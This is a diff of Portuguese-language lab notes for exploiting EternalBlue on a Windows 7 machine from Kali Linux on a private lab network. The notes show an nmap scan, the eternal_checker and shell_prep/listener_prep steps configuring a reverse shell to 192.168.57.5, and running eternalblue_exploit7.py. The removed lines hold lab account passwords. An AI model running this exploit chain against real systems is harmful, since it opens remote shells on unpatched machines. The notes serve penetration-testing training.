@@ -1,6 +1,10 @@
-Set Up - Blue (Blue == Windows)
-    User - Password123!
-    administrator - Password456!
+Para realizar esse laboratório utilizei um SO kali linux com as seguintes configurações:
+
+Linux kali 5.15.0-kali3-amd64 #1 SMP Debian 5.15.15-2kali1 (2022-01-31) x86_64 GNU/Linux
+
+Alvo:
+
+2- Windows 7 Ultimate 7601 Service Pack 1 microsoft-ds
 
     #nmap -p- -A -T4 192.168.57.6
         Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-31 15:12 EDT
@@ -160,18 +164,27 @@ Set Up - Blue (Blue == Windows)
         pip install -r requirements.txt
         python eternal_checker.py 192.168.57.6
         ./shell_prep.sh
-            Y
+            LHOST for reverse connection:
             192.168.57.5
+            LPORT you want x64 to listen on:
             9999
+            LPORT you want x86 to listen on:
             2222
+            Type 0 to generate a meterpreter shell or 1 to generate a regular cmd shell
             1
             0
+            
         listener_prep.sh
+            LHOST for reverse connection:
             192.168.57.5
+            LPORT for x64 reverse connection:
             9999
+            LPORT for x86 reverse connection:
             2222
-            1
+            Enter 0 for meterpreter shell or 1 for regular cmd shell:
             0
+                Starting listener...
+                
         python eternalblue_exploit7.py 192.168.57.6
 
 
